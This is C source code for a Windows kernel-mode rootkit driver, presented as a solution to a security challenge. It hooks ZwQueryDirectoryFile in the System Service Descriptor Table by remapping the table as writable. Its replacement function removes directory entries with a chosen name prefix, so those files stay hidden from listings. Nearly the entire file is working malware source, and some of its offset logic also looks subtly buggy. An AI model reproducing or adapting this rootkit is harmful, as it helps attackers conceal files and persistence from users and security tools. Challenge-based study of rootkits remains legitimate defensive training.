// Rootkit by Udonsi Kelechukwu
// TD_SECDEV challenge solution

#include "ntifs.h"
#include "ntddk.h"

PMDL g_pmdlSystemCall;
PVOID *MappedSystemCallTable;

// Some useful datastructure
#pragma pack(1)
typedef struct ServiceDescriptorEntry {
  unsigned int *ServiceTableBase;
  unsigned int *ServiceCounterTableBase;
  unsigned int NumberOfServices;
  unsigned char *ParamTableBase;
} SSDT_Entry;
#pragma pack()

typedef union CurrentFileInformation {
  FILE_BOTH_DIR_INFORMATION *fbdi;
  FILE_DIRECTORY_INFORMATION *fdi;
  FILE_FULL_DIR_INFORMATION *ffdi;
  FILE_NAMES_INFORMATION *fni;
} Current_FI;

typedef union PreviousFileInformation {
  FILE_BOTH_DIR_INFORMATION *fbdi;
  FILE_DIRECTORY_INFORMATION *fdi;
  FILE_FULL_DIR_INFORMATION *ffdi;
  FILE_NAMES_INFORMATION *fni;
} Previous_FI;

typedef struct FileInformation{
 Current_FI CFI;
 Previous_FI PFI;
} FI;

__declspec(dllimport) SSDT_Entry KeServiceDescriptorTable;

// Define some useful MACROS 
#define SYSTEMSERVICE(_func)\
  KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_func+1)]

#define SYSCALL_INDEX(_func)*(PULONG)((PUCHAR)_func+1)

// Define the (un)hooking oricedures
#define HOOK_SYSCALL(_func, _Hook, _Out)\
  _Out = (PVOID) InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_func)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_func, _Orig)\
  InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_func)], (LONG) _Orig)

// FileName prefix to exclude (Would update to receive from user level using device)
const WCHAR prefix[] = L"TD_SECDEV_REMOVED";

PDEVICE_OBJECT g_RootkitDevice;

DRIVER_DISPATCH OnStubDispatch;
DRIVER_UNLOAD OnUnload;

NTSYSAPI
NTSTATUS
NTAPI ZwQueryDirectoryFile(
      HANDLE                 FileHandle,
      HANDLE                 Event,
      PIO_APC_ROUTINE        ApcRoutine,
      PVOID                  ApcContext,
      PIO_STATUS_BLOCK       IoStatusBlock,
      PVOID                  FileInformation,
      ULONG                  Length,
      FILE_INFORMATION_CLASS FileInformationClass,
      BOOLEAN                ReturnSingleEntry,
      PUNICODE_STRING        FileName,
      BOOLEAN                RestartScan
      );

// declare a pointer for the original system call
typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
      HANDLE                 FileHandle,
      HANDLE                 Event,
      PIO_APC_ROUTINE        ApcRoutine,
      PVOID                  ApcContext,
      PIO_STATUS_BLOCK       IoStatusBlock,
      PVOID                  FileInformation,
      ULONG                  Length,
      FILE_INFORMATION_CLASS FileInformationClass,
      BOOLEAN                ReturnSingleEntry,
      PUNICODE_STRING        FileName,
      BOOLEAN                RestartScan
);
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;

// define the replacement system call
NTSTATUS NewZwQueryDirectoryFile(
      HANDLE                 FileHandle,
      HANDLE                 Event,
      PIO_APC_ROUTINE        ApcRoutine,
      PVOID                  ApcContext,
      PIO_STATUS_BLOCK       IoStatusBlock,
      PVOID                  FileInformation,
      ULONG                  Length,
      FILE_INFORMATION_CLASS FileInformationClass,
      BOOLEAN                ReturnSingleEntry,
      PUNICODE_STRING        FileName,
      BOOLEAN                RestartScan
  ){

    ULONG size_of_victim_s = 0;
    FI FileInfo;

    // Call the original ZwQueryDirectoryFile
    NTSTATUS nt_original_status = OldZwQueryDirectoryFile(
                          FileHandle,
                          Event,
                          ApcRoutine,
                          ApcContext,
                          IoStatusBlock,
                          FileInformation,
                          Length,
                          FileInformationClass,
                          ReturnSingleEntry,
                          FileName,
                          RestartScan);

    // check call status
    if (NT_SUCCESS(nt_original_status)){

      // check the FileInformationClass
      switch (FileInformationClass){
        // Return a FILE_BOTH_DIR_INFORMATION structure for each file. TODO: Implement
          //typedef struct _FILE_BOTH_DIR_INFORMATION {
          //  ULONG         NextEntryOffset;
          //  ULONG         FileIndex;
          //  LARGE_INTEGER CreationTime;
          //  LARGE_INTEGER LastAccessTime;
          //  LARGE_INTEGER LastWriteTime;
          //  LARGE_INTEGER ChangeTime;
          //  LARGE_INTEGER EndOfFile;
          //  LARGE_INTEGER AllocationSize;
          //  ULONG         FileAttributes;
          //  ULONG         FileNameLength;
          //  ULONG         EaSize;
          //  CCHAR         ShortNameLength;
          //  WCHAR         ShortName[12];
          //  WCHAR         FileName[1];
          //} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;
        case FileBothDirectoryInformation:
          // initialize the cur and previous pointers.
          FileInfo.CFI.fbdi = (FILE_BOTH_DIR_INFORMATION *)FileInformation;
          FileInfo.PFI.fbdi = NULL;

          // iterate over all entries
          while (FileInfo.CFI.fbdi) {
            // check if the first few characters of the filename are TD_SECDEV_REMOVED
            if (memcmp(FileInfo.CFI.fbdi->FileName, prefix, 34) == 0) {
              size_of_victim_s += FileInfo.PFI.fbdi ? FileInfo.CFI.fbdi->NextEntryOffset : FileInfo.CFI.fbdi->NextEntryOffset - FileInfo.PFI.fbdi->NextEntryOffset;
              // our match is the first entry
              if (!FileInfo.PFI.fbdi){
                // Skip it if other enteries, else set it to NULL
                (char *)FileInformation = ((FILE_BOTH_DIR_INFORMATION *)FileInformation)->NextEntryOffset ? (char *)FileInformation + ((FILE_BOTH_DIR_INFORMATION *)FileInformation)->NextEntryOffset : NULL; 
              } else if (!FileInfo.CFI.fbdi->NextEntryOffset) { // Our match is the last entry
                FileInfo.PFI.fbdi->NextEntryOffset = 0; // set previous as the last entry
              } else {
                // adjust previous offset to account for our size
                FileInfo.PFI.fbdi->NextEntryOffset += FileInfo.CFI.fbdi->NextEntryOffset;
              }
            }
            FileInfo.PFI.fbdi = FileInfo.CFI.fbdi; 
            (char *)(FileInfo.CFI.fbdi) = FileInfo.CFI.fbdi->NextEntryOffset ? (char *)(FileInfo.CFI.fbdi) + FileInfo.CFI.fbdi->NextEntryOffset : NULL;
          }
          break;
        // 	Return a FILE_DIRECTORY_INFORMATION structure for each file. TODO: Implement
          //typedef struct _FILE_DIRECTORY_INFORMATION {
          //  ULONG         NextEntryOffset;
          //  ULONG         FileIndex;
          //  LARGE_INTEGER CreationTime;
          //  LARGE_INTEGER LastAccessTime;
          //  LARGE_INTEGER LastWriteTime;
          //  LARGE_INTEGER ChangeTime;
          //  LARGE_INTEGER EndOfFile;
          //  LARGE_INTEGER AllocationSize;
          //  ULONG         FileAttributes;
          //  ULONG         FileNameLength;
          //  WCHAR         FileName[1];
          //} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
        case FileDirectoryInformation:
          FileInfo.CFI.fdi = (FILE_DIRECTORY_INFORMATION *)FileInformation;
          FileInfo.PFI.fdi = NULL;
          size_of_victim_s = 0;
          // iterate over all entries
          while (FileInfo.CFI.fdi) {
            // check if the first few characters of the filename are TD_SECDEV_REMOVED
            if (memcmp(FileInfo.CFI.fdi->FileName, prefix, 34) == 0) {
              size_of_victim_s += FileInfo.PFI.fdi ? FileInfo.CFI.fdi->NextEntryOffset : FileInfo.CFI.fdi->NextEntryOffset - FileInfo.PFI.fdi->NextEntryOffset;
              // our match is the first entry
              if (!FileInfo.PFI.fdi){
                // Skip it if other enteries, else set it to NULL
                (char *)FileInformation = ((FILE_DIRECTORY_INFORMATION *)FileInformation)->NextEntryOffset ? (char *)FileInformation + ((FILE_DIRECTORY_INFORMATION *)FileInformation)->NextEntryOffset : NULL; 
              } else if (!FileInfo.CFI.fdi->NextEntryOffset) { // Our match is the last entry
                FileInfo.PFI.fdi->NextEntryOffset = 0; // set previous as the last entry
              } else {
                // adjust previous offset to account for our size
                FileInfo.PFI.fdi->NextEntryOffset += FileInfo.CFI.fdi->NextEntryOffset;
              }
            }
            FileInfo.PFI.fdi = FileInfo.CFI.fdi; 
            (char *)(FileInfo.CFI.fdi) = FileInfo.CFI.fdi->NextEntryOffset ? (char *)(FileInfo.CFI.fdi) + FileInfo.CFI.fdi->NextEntryOffset : NULL;
          }
          break;
        // Return a FILE_FULL_DIR_INFORMATION structure for each file. TODO: Implement
          //typedef struct _FILE_FULL_DIR_INFORMATION {
          //  ULONG         NextEntryOffset;
          //  ULONG         FileIndex;
          //  LARGE_INTEGER CreationTime;
          //  LARGE_INTEGER LastAccessTime;
          //  LARGE_INTEGER LastWriteTime;
          //  LARGE_INTEGER ChangeTime;
          //  LARGE_INTEGER EndOfFile;
          //  LARGE_INTEGER AllocationSize;
          //  ULONG         FileAttributes;
          //  ULONG         FileNameLength;
          //  ULONG         EaSize;
          //  WCHAR         FileName[1];
          //} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;
        case FileFullDirectoryInformation:
          FileInfo.CFI.ffdi = (FILE_FULL_DIR_INFORMATION *)FileInformation;
          FileInfo.PFI.ffdi = NULL;
          size_of_victim_s = 0;
          // iterate over all entries
          while (FileInfo.CFI.ffdi) {
            // check if the first few characters of the filename are TD_SECDEV_REMOVED
            if (memcmp(FileInfo.CFI.ffdi->FileName, prefix, 34) == 0) {
              size_of_victim_s += FileInfo.PFI.ffdi ? FileInfo.CFI.ffdi->NextEntryOffset : FileInfo.CFI.ffdi->NextEntryOffset - FileInfo.PFI.ffdi->NextEntryOffset;
              // our match is the first entry
              if (!FileInfo.PFI.ffdi){
                // Skip it if other enteries, else set it to NULL
                (char *)FileInformation = ((FILE_FULL_DIR_INFORMATION *)FileInformation)->NextEntryOffset ? (char *)FileInformation + ((FILE_FULL_DIR_INFORMATION *)FileInformation)->NextEntryOffset : NULL; 
              } else if (!FileInfo.CFI.ffdi->NextEntryOffset) { // Our match is the last entry
                FileInfo.PFI.ffdi->NextEntryOffset = 0; // set previous as the last entry
              } else {
                // adjust previous offset to account for our size
                FileInfo.PFI.ffdi->NextEntryOffset += FileInfo.CFI.ffdi->NextEntryOffset;
              }
            }
            FileInfo.PFI.ffdi = FileInfo.CFI.ffdi; 
            (char *)(FileInfo.CFI.ffdi) = FileInfo.CFI.ffdi->NextEntryOffset ? (char *)(FileInfo.CFI.ffdi) + FileInfo.CFI.ffdi->NextEntryOffset : NULL;
          }
          break;
        case FileIdBothDirectoryInformation:
        case FileIdFullDirectoryInformation:
          break;
        // Return a FILE_NAMES_INFORMATION structure for each file. TODO: Implement
          //typedef struct _FILE_NAMES_INFORMATION {
          //  ULONG NextEntryOffset;
          //  ULONG FileIndex;
          //  ULONG FileNameLength;
          //  WCHAR FileName[1];
          //} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;
        case FileNamesInformation:
          FileInfo.CFI.fni = (FILE_NAMES_INFORMATION *)FileInformation;
          FileInfo.PFI.fni = NULL;
          size_of_victim_s = 0;
          // iterate over all entries
          while (FileInfo.CFI.fni) {
            // check if the first few characters of the filename are TD_SECDEV_REMOVED
            if (memcmp(FileInfo.CFI.fni->FileName, prefix, 34) == 0) {
              size_of_victim_s += FileInfo.PFI.fni ? FileInfo.CFI.fni->NextEntryOffset : FileInfo.CFI.fni->NextEntryOffset - FileInfo.PFI.fni->NextEntryOffset;
              // our match is the first entry
              if (!FileInfo.PFI.fni){
                // Skip it if other enteries, else set it to NULL
                (char *)FileInformation = ((FILE_NAMES_INFORMATION *)FileInformation)->NextEntryOffset ? (char *)FileInformation + ((FILE_NAMES_INFORMATION *)FileInformation)->NextEntryOffset : NULL; 
              } else if (!FileInfo.CFI.fni->NextEntryOffset) { // Our match is the last entry
                FileInfo.PFI.fni->NextEntryOffset = 0; // set previous as the last entry
              } else {
                // adjust previous offset to account for our size
                FileInfo.PFI.fni->NextEntryOffset += FileInfo.CFI.fni->NextEntryOffset;
              }
            }
            FileInfo.PFI.fni = FileInfo.CFI.fni; 
            (char *)(FileInfo.CFI.fni) = FileInfo.CFI.fni->NextEntryOffset ? (char *)(FileInfo.CFI.fni) + FileInfo.CFI.fni->NextEntryOffset : NULL;
          }
          break;
        case FileObjectIdInformation:
        case FileReparsePointInformation:
          break;
        default:
          break;
      };

      // Update IoStatusBlock
      IoStatusBlock->Information -= size_of_victim_s;
    }
    return nt_original_status;
  }

// An unload function is required to safely unload the driver from memory without rebooting
VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{  
   // unhook system calls
   UNHOOK_SYSCALL( ZwQueryDirectoryFile, OldZwQueryDirectoryFile );

   // Unlock and Free MDL
   if(g_pmdlSystemCall)
   {
      MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
      IoFreeMdl(g_pmdlSystemCall);
   }
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	// theDriverObject has a pointer called DriverUnload. We assign this driver our OnUnload
	theDriverObject->DriverUnload  = OnUnload;

  // save old system call locations
  OldZwQueryDirectoryFile =(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));

  // Map the memory into our domain to change the prmissions 
  g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);

  if (!g_pmdlSystemCall)
    return STATUS_UNSUCCESSFUL;

  MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

  // change the flags of the MDL
  g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
  MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

  // Hook the system call
  HOOK_SYSCALL( ZwQueryDirectoryFile, NewZwQueryDirectoryFile, OldZwQueryDirectoryFile);
	return STATUS_SUCCESS;
}

